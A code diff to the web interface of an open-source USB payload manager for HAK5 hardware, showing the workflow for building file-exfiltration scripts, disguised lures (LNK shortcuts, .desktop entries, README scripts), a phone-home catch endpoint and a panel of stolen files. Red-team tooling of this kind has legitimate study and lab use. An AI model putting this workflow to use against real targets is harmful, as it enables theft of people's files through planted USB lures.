       .replace(/^(#.*)$/gm, '<span class="comment">$1</span>')
       .replace(/\b(import|from|def|class|if|else|elif|for|while|return|try|except|with|as|in|not|and|or|True|False|None)\b/g, '<span class="kw">$1</span>')
       .replace(/(".*?"|'.*?')/g, '<span class="str">$1</span>');
+  }
+  if (lang === 'LNK') {
+    return esc.replace(/^(#.*)$/gm, '<span class="comment">$1</span>');
   }
   return esc;
 }
@@ -3985,6 +4483,7 @@ async function renderReposTab() {
 }
 
 async function repoClone(device) {
+  closeRepos();
   clearTerm();
   showTerm();
   termLine(`TSK REPO MANAGER - ${device.toUpperCase()}`, 'cmd');
@@ -3994,6 +4493,7 @@ async function repoClone(device) {
     body:JSON.stringify({device})});
 }
 async function repoUpdate(device='all') {
+  closeRepos();
   clearTerm();
   showTerm();
   termLine('TSK REPO MANAGER - UPDATE', 'cmd');
@@ -4009,8 +4509,11 @@ function clearTerm() {
 function onRepoDone(dev, status) {
   termLine(`✓ ${dev} ready - ${status.payload_count} payloads indexed`, 'ok');
   toast(`${dev.toUpperCase()} ready - ${status.payload_count} payloads`, 'ok');
-  loadDevicePayloads(dev);
-  if (S.openOverlay === 'repos') renderReposTab();
+  loadDevicePayloads(dev).then(() => {
+    if (dev === S.device && status.payload_count > 0 && !S.selectedPayload?.path) {
+      toast('Payload list refreshed - select a payload to edit', 'info');
+    }
+  });
 }
 
 // ── CONFIG TAB ────────────────────────────────────────────────────────────────
@@ -4190,11 +4693,8 @@ function renderConfigTab() {
 function renderOperatorTab() {
   const list = document.getElementById('operator-modal-body');
   const user = S.currentUser || S.config?._user || '-';
-  if (list.querySelector('#op-current-name')) {
-    const nameEl = document.getElementById('op-current-name');
-    if (nameEl) nameEl.textContent = user;
-    return;
-  }
+  if (list.dataset.opUser === user && list.querySelector('#op-current-name')) return;
+  list.dataset.opUser = user;
   list.innerHTML = `<div class="cfg-panel cfg-panel-op">
     <div class="cfg-title">OPERATOR</div>
     <div class="cfg-op-card">
@@ -4398,46 +4898,58 @@ async function showAbout() {
     phoneHomeUrl = net.phone_home_url || '';
   } catch (e) { /* ignore */ }
 
-  const githubQr = `https://api.qrserver.com/v1/create-qr-code/?size=110x110&data=${encodeURIComponent(GITHUB_REPO_URL)}`;
+  const githubQr = `https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(GITHUB_REPO_URL)}`;
   const qr2Url = phoneHomeUrl || KOFI_URL;
   const qr2Label = phoneHomeUrl ? 'PHONE-HOME' : 'KO-FI';
-  const qr2Qr = `https://api.qrserver.com/v1/create-qr-code/?size=110x110&data=${encodeURIComponent(qr2Url)}`;
+  const qr2Qr = `https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=${encodeURIComponent(qr2Url)}`;
+
+  const teensyChip = TEENSY_ENABLED
+    ? '<span class="about-device-chip">TEENSY</span>'
+    : '<span class="about-device-chip muted">TEENSY SOON</span>';
 
   body.innerHTML = `
-    <div class="cfg-panel">
-      <div class="cfg-title">ABOUT</div>
+    <div class="cfg-panel cfg-panel-about">
       <div class="about-brand-row">
         <img class="about-avatar" src="${BRAND_AVATAR_URL}" alt="TSK | The Skeleton Key">
         <div>
           <div class="about-title-main">TSK | THE SKELETON KEY v1.0</div>
-          <div class="about-creator">Built by Neur0Sp1cy</div>
+          <div class="about-creator">Built by <strong>Neur0Sp1cy</strong></div>
         </div>
-      </div>
-      <div class="cfg-body-text about-lead">
-        A free, open source USB payload management platform for HAK5 hardware.
-      </div>
-      <div class="cfg-body-text about-devices-line">
-        Rubber Ducky · Bash Bunny · LAN Turtle · USB Dropper${TEENSY_ENABLED ? ' · Teensy' : ' · Teensy (coming soon)'}
-      </div>
-      <a class="about-github-link" href="${GITHUB_REPO_URL}" target="_blank" rel="noopener">github.com/neur0sp1cy/TSK2</a>
-      <div class="cfg-note about-meta-line">
-        DEF CON 34 · Las Vegas 2026 · ${total} payloads loaded
       </div>
 
-      <div class="about-qr-row">
-        <div class="about-qr-cell">
-          <a href="${GITHUB_REPO_URL}" target="_blank" rel="noopener">
-            <img src="${githubQr}" width="110" height="110" alt="GitHub QR">
-          </a>
-          <div class="about-qr-label">GITHUB</div>
-          <a class="about-qr-url" href="${GITHUB_REPO_URL}" target="_blank" rel="noopener">github.com/neur0sp1cy/TSK2</a>
+      <div class="about-intro-card">
+        <p class="about-lead">Free, open source USB payload management for authorized lab and field use.</p>
+        <div class="about-devices-row">
+          <span class="about-device-chip">RUBBER DUCKY</span>
+          <span class="about-device-chip">BASH BUNNY</span>
+          <span class="about-device-chip">LAN TURTLE</span>
+          <span class="about-device-chip">USB DROPPER</span>
+          ${teensyChip}
         </div>
-        <div class="about-qr-cell">
-          <a href="${qr2Url}" target="_blank" rel="noopener">
-            <img src="${qr2Qr}" width="110" height="110" alt="${qr2Label} QR">
-          </a>
-          <div class="about-qr-label">${qr2Label}</div>
-          <a class="about-qr-url" href="${qr2Url}" target="_blank" rel="noopener">${qr2Url.replace(/^https?:\/\//, '')}</a>
+        <div class="about-meta-row">
+          <span class="about-meta-pill accent">DEF CON 34</span>
+          <span class="about-meta-pill">LAS VEGAS 2026</span>
+          <span class="about-meta-pill">${total} PAYLOADS LOCKED AND LOADED</span>
+        </div>
+      </div>
+
+      <div class="about-qr-section">
+        <div class="about-qr-section-title">SCAN · CONNECT</div>
+        <div class="about-qr-row">
+          <div class="about-qr-cell">
+            <a href="${GITHUB_REPO_URL}" target="_blank" rel="noopener">
+              <img src="${githubQr}" width="120" height="120" alt="GitHub QR">
+            </a>
+            <div class="about-qr-label">GITHUB</div>
+            <a class="about-qr-url" href="${GITHUB_REPO_URL}" target="_blank" rel="noopener">github.com/neur0sp1cy/TSK2</a>
+          </div>
+          <div class="about-qr-cell">
+            <a href="${qr2Url}" target="_blank" rel="noopener">
+              <img src="${qr2Qr}" width="120" height="120" alt="${qr2Label} QR">
+            </a>
+            <div class="about-qr-label">${qr2Label}</div>
+            <a class="about-qr-url" href="${qr2Url}" target="_blank" rel="noopener">${qr2Url.replace(/^https?:\/\//, '')}</a>
+          </div>
         </div>
       </div>
 
@@ -4445,17 +4957,17 @@ async function showAbout() {
         <img src="${BRAND_HEADER_URL}" alt="Support TSK on Ko-fi">
       </div>
 
-      <div class="cfg-section-title" style="color:var(--red);margin-top:8px">SUPPORT THE PROJECT</div>
-      <div class="cfg-body-text" style="margin-bottom:12px">
-        TSK is free forever. If it's been useful in the field, consider buying me a coffee -
+      <div class="cfg-section-title" style="color:var(--red);margin-top:4px">SUPPORT THE PROJECT</div>
+      <div class="cfg-body-text" style="margin-bottom:12px;font-size:13px;line-height:1.55">
+        TSK is free forever. If it has been useful in the field, consider buying me a coffee -
         it goes straight back into hardware and development.
       </div>
-      <a class="about-kofi-link" href="${KOFI_URL}" target="_blank" rel="noopener">☕ ko-fi.com/neur0sp1cy</a>
+      <a class="about-kofi-link" href="${KOFI_URL}" target="_blank" rel="noopener">ko-fi.com/neur0sp1cy</a>
       <div class="cfg-body-hint" style="margin-top:12px">
         Questions or concerns: <a href="mailto:${CONTACT_EMAIL}" style="color:var(--cyan)">${CONTACT_EMAIL}</a>
       </div>
 
-      <div class="about-footer-tag">All tools free. Always. 🔑</div>
+      <div class="about-footer-tag">All tools free. Always.</div>
     </div>`;
 
   overlay.classList.add('visible');
@@ -4488,7 +5000,7 @@ function showHelp() {
       <div class="help-flow-step"><strong>1 · CONFIG</strong> - Set <span class="help-k">LHOST</span> / <span class="help-k">LPORT</span> (CONFIG modal or command bar).
         LHOST is your machine's LAN IP; LPORT is this TSK server (default 1337). Required for phone-home and test stubs.</div>
       <div class="help-flow-step"><strong>2 · SNARF → EXFIL</strong> - Pick what to steal (Windows PowerShell / Linux Bash).
-        <em>BUILD</em> generates a script → <em>SAVE</em> (or <em>SAVE + FLASH</em>) → script appears in the payload list under SNARFSNARF.</div>
+        <em>BUILD</em> generates a script → <em>SAVE</em> (or <em>SAVE + FLASH</em>) → script appears in the payload list under EXFILS.</div>
       <div class="help-flow-step"><strong>3 · SNARF → LURE</strong> - Windows: <span class="help-k">LNK</span> shortcut · Linux: <span class="help-k">README</span> script or <span class="help-k">.desktop</span> entry.
         Attach a saved exfil script or use a test stub. <em>SAVE PACKAGE</em> writes lure + payload to your library → <em>FLASH PACKAGE</em> copies all files to the stick.</div>
       <div class="help-flow-step"><strong>4 · FLASH</strong> - Plug a <em>plain USB stick</em> (not Bunny/Ducky). Right panel: scan stick, pick deploy (root or hidden <code>.tsk/</code>), preview, then FLASH.
@@ -4518,8 +5030,7 @@ function showHelp() {
       <div class="help-line"><span class="help-k">hack the planet</span> · <span class="help-k">htp</span> · <span class="help-k">hackers</span> - Classic overlay</div>
       <div class="help-line"><span class="help-k">defcon</span> · Konami code - DEF CON flash + <a href="https://defcon.org/" target="_blank" rel="noopener" style="color:var(--cyan)">defcon.org</a></div>
       <div class="help-line"><span class="help-k">play</span> · <span class="help-k">pause</span> · <span class="help-k">stop</span> · <span class="help-k">next</span> · <span class="help-k">back</span> · <span class="help-k">np</span> - Music player (<code>web/static/music/</code>)</div>
-      <div class="help-line"><span class="help-k">present</span> · <span class="help-k">present off</span> - Projector / demo layout</div>
-      <div class="help-line"><span class="help-k">demo on</span> · <span class="help-k">demo off</span> - Presentation + DEF CON styling + dismiss LHOST hint</div>
+      <div class="help-line"><span class="help-k">present</span> · <span class="help-k">present off</span> - Projector layout (hides sidebar, larger type, dismisses LHOST hint)</div>
       <div class="help-line"><span class="help-k">theme &lt;name&gt;</span> - default · pushed · matrix · cinematic · light · flat</div>
       <div style="margin-top:18px;display:flex;gap:10px;flex-wrap:wrap;align-items:center;">
         <a class="help-tutorial-btn" href="/tutorial" target="_blank" rel="noopener">◈ OPEN TUTORIAL</a>
@@ -4588,7 +5099,10 @@ async function doFlash() {
     document.getElementById('flash-bar-wrap').style.display = 'none';
     try {
       const pr = await fetch(
-        `/api/dropper/lure/package-files?username=${encodeURIComponent(S.currentUser||'')}&lure=${encodeURIComponent(S.payload.file||'')}`
+        `/api/dropper/lure/package-files?username=${encodeURIComponent(S.currentUser||'')}` +
+        (S.payload.package_id
+          ? `&package_id=${encodeURIComponent(S.payload.package_id)}`
+          : `&lure=${encodeURIComponent(S.payload.file||'')}`)
       );
       const pd = await pr.json();
       const filenames = pd.filenames || [S.payload.file];
@@ -4666,7 +5180,37 @@ async function doEdit() {
   await openEditor(p);
 }
 
+function editorCanRenameFile(payload) {
+  if (!payload?.path || !isUserPayload(payload)) return false;
+  return !payload.path.replace(/\\/g, '/').includes('/packages/');
+}
+
+function setEditorFilenameUi(payload) {
+  const span = document.getElementById('editor-filename');
+  const input = document.getElementById('editor-filename-input');
+  if (!span || !input) return;
+  const canRename = editorCanRenameFile(payload);
+  if (canRename) {
+    span.style.display = 'none';
+    input.style.display = '';
+    input.value = payload.file || payload.name || '';
+  } else {
+    input.style.display = 'none';
+    span.style.display = '';
+    span.textContent = payload.file || payload.name || 'untitled';
+  }
+}
+
+function onEditorFilenameInput() {
+  S.editorDirty = true;
+  document.getElementById('editor-modified')?.classList.add('visible');
+}
+
 async function openEditor(payload) {
+  if (isBinaryPayload(payload)) {
+    toast('LNK shortcuts are binary - edit the companion .ps1 or rebuild in SNARF → LURE', 'warn');
+    return;
+  }
   const path = payload.path || '';
   let content = '';
 
@@ -4685,6 +5229,10 @@ async function openEditor(payload) {
           `⚠ ${data.error || 'Could not read file'} - showing template`;
         document.getElementById('editor-save-status').style.color = 'var(--yellow)';
         console.warn('[TSK Editor] read failed:', data.error, 'path:', path);
+      } else if (data.binary) {
+        toast('Cannot edit binary shortcut files', 'warn');
+        btn.disabled = false;
+        return;
       } else {
         content = data.content || getPreviewTemplate(payload);
       }
@@ -4699,13 +5247,13 @@ async function openEditor(payload) {
   // Populate editor
   const ta = document.getElementById('editor-textarea');
   ta.value = content;
-  document.getElementById('editor-filename').textContent = payload.file || payload.name;
+  setEditorFilenameUi(payload);
   document.getElementById('editor-device-badge').textContent = payload.lang || 'TXT';
   document.getElementById('editor-modified').classList.remove('visible');
   document.getElementById('ed-btn-save').disabled = false;
   document.getElementById('editor-save-status').textContent = path
     ? (isRepoPayloadPath(path) ? `Repo file (read-only) - Save writes to MY PAYLOADS` : `Editing: ${path}`)
-    : 'No file path - Save writes to MY PAYLOADS';
+    : 'Preview payload - Save writes to MY PAYLOADS';
   document.getElementById('editor-save-status').style.color =
     path && !isRepoPayloadPath(path) ? 'var(--text)' : 'var(--yellow)';
 
@@ -4895,6 +5443,41 @@ async function edSave() {
   const btn = document.getElementById('ed-btn-save');
   btn.disabled = true;
 
+  if (path && editorCanRenameFile(S.editorPayload)) {
+    const newName = (document.getElementById('editor-filename-input')?.value || '').trim();
+    const oldFile = S.editorPayload?.file || '';
+    if (newName && oldFile && newName !== oldFile) {
+      statusEl.textContent = 'Renaming...';
+      statusEl.style.color = 'var(--yellow)';
+      try {
+        const rr = await fetch('/api/payload/rename', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ path, name: newName }),
+        });
+        const rd = await rr.json();
+        if (!rr.ok || !rd.ok) {
+          statusEl.textContent = `✗ ${rd.error || 'Rename failed'}`;
+          statusEl.style.color = 'var(--red)';
+          toast(rd.error || 'Rename failed', 'err');
+          btn.disabled = false;
+          return;
+        }
+        path = rd.payload.path;
+        S.editorPath = path;
+        S.editorPayload = rd.payload;
+        S.selectedPayload = rd.payload;
+        S.payload = rd.payload;
+        invalidateLureOptions();
+      } catch (e) {
+        statusEl.textContent = `✗ ${e}`;
+        statusEl.style.color = 'var(--red)';
+        btn.disabled = false;
+        return;
+      }
+    }
+  }
+
   if (!path || isRepoPayloadPath(path)) {
     statusEl.textContent = 'Saving to MY PAYLOADS...';
     statusEl.style.color = 'var(--yellow)';
@@ -4923,6 +5506,7 @@ async function edSave() {
       statusEl.textContent = `✓ Saved to MY PAYLOADS`;
       statusEl.style.color = 'var(--green)';
       toast('Saved to MY PAYLOADS', 'ok');
+      queuePayloadSelection({ path: data.payload.path });
       await loadDevicePayloads(S.device);
       btn.disabled = false;
       return;
@@ -4946,10 +5530,16 @@ async function edSave() {
     if (data.ok) {
       S.editorDirty = false;
       S.editorPath = data.path;
+      if (S.editorPayload) {
+        S.editorPayload = Object.assign({}, S.editorPayload, { path: data.path });
+        setEditorFilenameUi(S.editorPayload);
+      }
       document.getElementById('editor-modified').classList.remove('visible');
       statusEl.textContent = `✓ Saved ${data.bytes} bytes`;
       statusEl.style.color = 'var(--green)';
       toast('File saved!', 'ok');
+      invalidateLureOptions();
+      await loadDevicePayloads(S.device);
       // Auto-refresh the preview panel with new content
       if (S.selectedPayload) {
         const updatedPayload = Object.assign({}, S.selectedPayload, {path: data.path});
@@ -5067,14 +5657,53 @@ let sshWs = null;
 // ── SNARFSNARF (USB Dropper builder) ─────────────────────────────────────────
 let _snarfOptions = null;
 let _snarfBuilt = null;
+let _snarfFormDraft = null;
 let _snarfMode = 'build';
 let _snarfFeed = [];
 let _lureOptions = null;
 let _lureBuilt = null;
+let _lureFormDraft = null;
 
 function setSnarfMode(mode) {
-  _snarfMode = mode === 'catch' ? 'catch' : mode === 'lure' ? 'lure' : 'build';
+  if (_snarfMode === 'build') captureSnarfFormDraft();
+  if (_snarfMode === 'lure') captureLureFormDraft();
+  const next = mode === 'catch' ? 'catch' : mode === 'lure' ? 'lure' : 'build';
+  if (next === 'lure') invalidateLureOptions();
+  _snarfMode = next;
   renderSnarfPanel();
+}
+
+function invalidateSnarfBuild() {
+  _snarfBuilt = null;
+  const wrap = document.getElementById('snarf-build-preview');
+  if (wrap) wrap.style.display = 'none';
+  const code = document.getElementById('snarf-preview-code');
+  if (code) code.textContent = '';
+  const meta = document.getElementById('snarf-preview-file');
+  if (meta) meta.textContent = '';
+  const warnEl = document.getElementById('snarf-warnings');
+  if (warnEl) warnEl.innerHTML = '';
+}
+
+function invalidateLureOptions() {
+  _lureOptions = null;
+}
+
+function captureSnarfFormDraft() {
+  if (!document.getElementById('snarf-name')) return;
+  _snarfFormDraft = snarfFormData();
+}
+
+function wireSnarfFormListeners() {
+  ['snarf-name', 'snarf-custom', 'snarf-output', 'snarf-format', 'snarf-zip'].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.addEventListener('input', invalidateSnarfBuild);
+    el.addEventListener('change', invalidateSnarfBuild);
+  });
+  document.querySelectorAll('[data-snarf-target]').forEach(el => {
+    el.addEventListener('change', invalidateSnarfBuild);
+  });
 }
 
 function snarfIntroCards(active) {
@@ -5096,9 +5725,9 @@ function snarfIntroCards(active) {
 }
 
 function snarfBuildPreviewBlock() {
-  return `<div id="snarf-build-preview" class="snarf-build-preview" style="display:none">
-    <div class="snarf-label">BUILD PREVIEW</div>
-    <div id="snarf-preview-file" style="font-size:14px;color:var(--yellow);margin-bottom:6px"></div>
+  return `<div id="snarf-build-preview" class="snarf-build-preview" style="display:none" aria-live="polite">
+    <div class="snarf-label">SCRIPT PREVIEW</div>
+    <div id="snarf-preview-file" class="snarf-preview-meta"></div>
     <pre class="snarf-preview-panel" id="snarf-preview-code"></pre>
   </div>`;
 }
@@ -5108,6 +5737,34 @@ function formatBytes(n) {
   if (b < 1024) return `${b} B`;
   if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
   return `${(b / (1024 * 1024)).toFixed(2)} MB`;
+}
+
+function snarfEndpointUrl() {
+  const lhost = (S.config?.lhost || '').trim();
+  const lport = (S.config?.lport || '1337').trim() || '1337';
+  if (!lhost) return null;
+  return `http://${lhost}:${lport}/api/snarf`;
+}
+
+function snarfEndpointLinkHtml() {
+  const lport = (S.config?.lport || '1337').trim() || '1337';
+  const url = snarfEndpointUrl();
+  if (url) {
+    return `<a class="snarf-endpoint-link" href="${url}" target="_blank" rel="noopener noreferrer" title="Open snarf catch status page (exfil uses POST)">${url}</a>`;
+  }
+  return `<span class="snarf-endpoint-link snarf-endpoint-link--disabled" title="Set LHOST in CONFIG">http://&lt;LHOST&gt;:${lport}/api/snarf</span>`;
+}
+
+function snarfEndpointBarHtml() {
+  const hasUrl = !!snarfEndpointUrl();
+  const hint = hasUrl
+    ? 'Exfil scripts POST multipart uploads to this URL. Browser GET opens a reachability status page (not the file browser - use this CATCH tab for that).'
+    : 'Set LHOST in <a onclick="closeSnarf();showConfig()" style="color:var(--cyan);cursor:pointer">CONFIG</a> to show your lab URL.';
+  return `<div class="snarf-endpoint-bar" id="snarf-endpoint-bar">
+    <div class="snarf-endpoint-label">PHONE-HOME URL</div>
+    ${snarfEndpointLinkHtml()}
+    <div class="snarf-endpoint-hint">${hint}</div>
+  </div>`;
 }
 
 function onSnarfCatch(msg) {
@@ -5132,7 +5789,10 @@ function renderSnarfCatchFeed() {
   const el = document.getElementById('snarf-catch-feed');
   if (!el) return;
   const port = (S.config.lport || '1337').trim() || '1337';
-  const listenLine = `<div class="snarf-catch-listen">● Listening on <code>:${port}</code> · POST /api/snarf</div>`;
+  const url = snarfEndpointUrl();
+  const listenLine = url
+    ? `<div class="snarf-catch-listen">● Listening · port <code>${port}</code> · <a class="snarf-endpoint-link" href="${url}" target="_blank" rel="noopener noreferrer">${url}</a></div>`
+    : `<div class="snarf-catch-listen">● Listening on port <code>${port}</code> · set LHOST in CONFIG for URL</div>`;
   const lastLine = S.lastSnarfCatch
     ? `<div class="snarf-catch-listen" style="color:var(--text)">Last catch: ${S.lastSnarfCatch}</div>`
     : '';
@@ -5148,6 +5808,57 @@ function renderSnarfCatchFeed() {
       · <span class="sz">${formatBytes(e.size)}</span>
       <br><span style="color:var(--text)">${e.original_filepath || e.relative}</span>
     </div>`).join('');
+}
+
+async function snarfDownloadBlob(url, fallbackName) {
+  const r = await fetch(url);
+  if (!r.ok) {
+    let msg = `Download failed (${r.status})`;
+    try {
+      const data = await r.json();
+      msg = data.detail || data.error || msg;
+    } catch (e) { /* binary or empty body */ }
+    throw new Error(msg);
+  }
+  const blob = await r.blob();
+  const disp = r.headers.get('Content-Disposition') || '';
+  const match = /filename="?([^";]+)"?/i.exec(disp);
+  const name = (match && match[1]) || fallbackName || 'download';
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = name;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+  URL.revokeObjectURL(a.href);
+}
+
+async function snarfDownloadFile(rel) {
+  try {
+    await snarfDownloadBlob(
+      `/api/snarf/download?path=${encodeURIComponent(rel)}`,
+      (rel || '').split('/').pop() || 'snarf_file'
+    );
+  } catch (e) {
+    toast(`✗ ${e.message || e}`, 'err');
+  }
+}
+
+async function snarfExportZip(timestamp, hostname) {
+  const params = new URLSearchParams();
+  if (timestamp) params.set('timestamp', timestamp);
+  if (hostname) params.set('hostname', hostname);
+  const qs = params.toString();
+  const url = qs ? `/api/snarf/export?${qs}` : '/api/snarf/export';
+  const label = hostname && timestamp
+    ? `snarf_${hostname}_${timestamp}.zip`
+    : 'snarf_export.zip';
+  try {
+    await snarfDownloadBlob(url, label);
+    toast('✓ Export started', 'ok');
+  } catch (e) {
+    toast(`✗ ${e.message || e}`, 'err');
+  }
 }
 
 async function loadSnarfCatches() {
@@ -5166,7 +5877,7 @@ async function loadSnarfCatches() {
         <div class="snarf-catch-session-h">${s.hostname} · ${s.timestamp}
           <span style="color:var(--text);font-weight:400">(${s.file_count} files · ${formatBytes(s.total_size)})</span>
           <button type="button" class="snarf-mini-btn" onclick="snarfDeleteSession('${s.timestamp}','${s.hostname}')">✕</button>
-          <a class="snarf-mini-btn" href="/api/snarf/export?timestamp=${encodeURIComponent(s.timestamp)}&hostname=${encodeURIComponent(s.hostname)}">ZIP</a>
+          <button type="button" class="snarf-mini-btn" onclick="snarfExportZip('${s.timestamp}','${s.hostname}')">ZIP</button>
         </div>
         ${(s.files || []).map(f => `
           <div class="snarf-catch-file">
@@ -5174,7 +5885,7 @@ async function loadSnarfCatches() {
             <span class="sz">${formatBytes(f.size)}</span>
             <button type="button" class="snarf-mini-btn" onclick="snarfPreviewFile('${f.relative.replace(/'/g, "\\'")}')">👁</button>
             <button type="button" class="snarf-mini-btn" onclick="snarfDeleteFile('${f.relative.replace(/'/g, "\\'")}')">✕</button>
-            <a href="/api/snarf/download?path=${encodeURIComponent(f.relative)}" target="_blank" rel="noopener">⬇</a>
+            <button type="button" class="snarf-mini-btn" onclick="snarfDownloadFile('${f.relative.replace(/'/g, "\\'")}')">⬇</button>
           </div>`).join('')}
       </div>`).join('');
   } catch (e) {
@@ -5331,7 +6042,9 @@ async function updateFlashPreview() {
     });
     const data = await r.json();
     if (!r.ok) throw new Error(data.error || 'Preview failed');
-    varsEl.textContent = `LHOST=${data.lhost} · LPORT=${data.lport}${data.substituted ? ' · vars substituted' : ''}`;
+    varsEl.textContent = data.binary
+      ? `LHOST=${data.lhost} · LPORT=${data.lport} · binary lure (verbatim copy)`
+      : `LHOST=${data.lhost} · LPORT=${data.lport}${data.substituted ? ' · vars substituted' : ''}`;
     const diff = data.diff || {};
     diffEl.className = '';
     if (S.device === 'usb' && diff.on_stick) {
@@ -5380,10 +6093,18 @@ async function doLogout() {
   try {
     await fetch('/api/auth/logout', { method: 'POST' });
   } catch (e) { /* ignore */ }
+  stopDevicePolling();
+  if (S.ws) {
+    S.ws.onclose = null;
+    try { S.ws.close(); } catch (e) { /* ignore */ }
+    S.ws = null;
+  }
   S.authToken = '';
   S.currentUser = '';
   sessionStorage.removeItem('tsk_token');
   clearLoginFields();
+  closeAllOverlays();
+  resetOperatorTab();
   document.getElementById('app').classList.remove('visible');
   await showLogin();
   toast('Logged out', 'ok');
@@ -5439,8 +6160,7 @@ async function doOperatorRename() {
       else updateOperatorHeader(data.username);
       document.getElementById('op-rename-new').value = '';
       document.getElementById('op-rename-password').value = '';
-      const opBody = document.getElementById('operator-modal-body');
-      if (opBody?.querySelector('#op-current-name')) opBody.innerHTML = '';
+      resetOperatorTab();
       renderOperatorTab();
       toast(`Renamed to ${data.username}`, 'ok');
     } else {
@@ -5509,26 +6229,32 @@ async function renderSnarfCatchPanel() {
   if (!panel) return;
   panel.innerHTML = `
     <div class="snarf-sub">Phone-home exfil lands at <code style="color:var(--cyan)">POST /api/snarf</code>
-      → <code>snarfed/&lt;operator&gt;/&lt;timestamp&gt;/&lt;hostname&gt;/</code>
-      · Set LHOST in <a onclick="closeSnarf();showConfig()" style="color:var(--cyan);cursor:pointer">CONFIG</a></div>
+      → <code>snarfed/&lt;operator&gt;/&lt;timestamp&gt;/&lt;hostname&gt;/</code></div>
     ${snarfIntroCards('catch')}
-    <div class="snarf-mode-panel">
+    ${snarfEndpointBarHtml()}
+    <div class="snarf-mode-panel snarf-mode-panel--catch">
     <div class="snarf-catch-wrap">
       <div class="snarf-catch-col">
         <div class="snarf-catch-title">LIVE FEED</div>
         <div class="snarf-catch-feed" id="snarf-catch-feed"></div>
       </div>
-      <div class="snarf-catch-col">
-        <div class="snarf-catch-title">SNARFED FILES</div>
-        <div class="snarf-catch-tree" id="snarf-catch-tree"></div>
-        <div class="snarf-catch-title" style="margin-top:12px">PREVIEW</div>
-        <pre class="snarf-preview-panel" id="snarf-preview-panel">Select 👁 on a file to preview</pre>
+      <div class="snarf-catch-col snarf-catch-col--right">
+        <div class="snarf-catch-files-block">
+          <div class="snarf-catch-title">SNARFED FILES</div>
+          <div class="snarf-catch-tree" id="snarf-catch-tree"></div>
+        </div>
+        <div class="snarf-catch-preview-block">
+          <div class="snarf-catch-title">PREVIEW</div>
+          <pre class="snarf-preview-panel snarf-catch-preview-panel" id="snarf-preview-panel">Select 👁 on a file to preview</pre>
+        </div>
       </div>
     </div>
     </div>
+    <div class="snarf-footer">
     <div class="snarf-actions">
       <button class="snarf-btn" onclick="loadSnarfCatches()">↻ REFRESH</button>
-      <a class="snarf-btn" href="/api/snarf/export" style="text-decoration:none;display:inline-block">⬇ EXPORT ALL</a>
+      <button class="snarf-btn" onclick="snarfExportZip()">⬇ EXPORT ALL</button>
+    </div>
     </div>`;
   try {
     const logR = await fetch('/api/snarf/log?limit=1');
@@ -5557,6 +6283,7 @@ async function refreshUsbMounts() {
 }
 
 function updateUsbStickSidebar(mounts) {
+  refreshDeviceBadges();
   updateArmedState();
 }
 
@@ -5671,15 +6398,23 @@ async function renderSnarfPanel() {
   const panel = document.getElementById('snarf-modal-body');
   if (!panel) return;
   const opts = await loadSnarfOptions();
-  const targetHtml = (opts.targets || []).map(t => `
+  const draft = _snarfFormDraft || {};
+  const targetHtml = (opts.targets || []).map(t => {
+    const checked = draft.targets && Object.prototype.hasOwnProperty.call(draft.targets, t.id)
+      ? draft.targets[t.id]
+      : t.id === 'documents';
+    return `
     <label class="snarf-check">
-      <input type="checkbox" data-snarf-target="${t.id}" ${t.id === 'documents' ? 'checked' : ''}>
+      <input type="checkbox" data-snarf-target="${t.id}" ${checked ? 'checked' : ''}>
       <span>${t.label}<small>${t.desc}</small></span>
-    </label>`).join('');
+    </label>`;
+  }).join('');
   const outputHtml = (opts.output_modes || []).map(m =>
-    `<option value="${m.id}">${m.label}</option>`).join('');
+    `<option value="${m.id}" ${draft.output_mode === m.id ? 'selected' : ''}>${m.label}</option>`).join('');
   const formatHtml = (opts.formats || []).map(f =>
-    `<option value="${f.id}">${f.label}</option>`).join('');
+    `<option value="${f.id}" ${draft.format === f.id ? 'selected' : ''}>${f.label}</option>`).join('');
+  const scriptName = (draft.script_name || 'snarf_exfil').trim() || 'snarf_exfil';
+  const zipChecked = !!draft.zip;
 
   panel.innerHTML = `
     <div class="snarf-sub">Build exfil scripts, save to your payload library, then flash from the list.
@@ -5687,37 +6422,44 @@ async function renderSnarfPanel() {
     ${snarfIntroCards('build')}
     <div class="snarf-mode-panel">
     <div class="snarf-section">
+      <div class="snarf-label">SCRIPT NAME</div>
+      <input class="snarf-input" id="snarf-name" type="text" value="${scriptName.replace(/"/g, '&quot;')}" placeholder="my_lab_exfil" style="width:100%;max-width:320px">
+      <div class="snarf-sub" style="margin:8px 0 0;font-size:12px">Saved under EXFILS as this name (.sh / .ps1).</div>
+    </div>
+    <div class="snarf-section">
       <div class="snarf-label">EXFIL TARGETS</div>
       <div class="snarf-grid">${targetHtml}</div>
     </div>
     <div class="snarf-section">
       <div class="snarf-label">CUSTOM PATTERN</div>
       <input class="snarf-input" id="snarf-custom" type="text" placeholder="e.g. *.kdbx or .env (comma-separated)"
-             style="width:100%;max-width:480px">
+             style="width:100%;max-width:520px" value="${(draft.custom_patterns || '').replace(/"/g, '&quot;')}">
     </div>
     <div class="snarf-section">
       <div class="snarf-label">OUTPUT & FORMAT</div>
-      <div class="snarf-row">
-        <select class="snarf-select" id="snarf-output">${outputHtml}</select>
-        <select class="snarf-select" id="snarf-format">${formatHtml}</select>
-        <input class="snarf-input" id="snarf-name" type="text" value="snarf_exfil" placeholder="script name" style="width:140px">
+      <div class="snarf-row snarf-row--output">
+        <select class="snarf-select snarf-field-grow" id="snarf-output">${outputHtml}</select>
+        <select class="snarf-select snarf-field-format" id="snarf-format">${formatHtml}</select>
       </div>
-      <div class="snarf-row">
-        <label class="snarf-check" style="display:inline-flex;align-items:center">
-          <input type="checkbox" id="snarf-zip"> Zip archive
+      <div class="snarf-row snarf-row--inline">
+        <label class="snarf-check snarf-check--compact">
+          <input type="checkbox" id="snarf-zip" ${zipChecked ? 'checked' : ''}> Zip archive
         </label>
       </div>
-      <div class="snarf-sub" style="margin-top:6px;margin-bottom:0">LHOST: <span style="color:var(--red)">${S.config?.lhost || 'not set'}</span>
-        · LPORT: <span style="color:var(--red)">${S.config?.lport || '1337'}</span></div>
-    </div>
+      <div class="snarf-lhost-line">LHOST: <span class="snarf-lhost-val">${S.config?.lhost || 'not set'}</span>
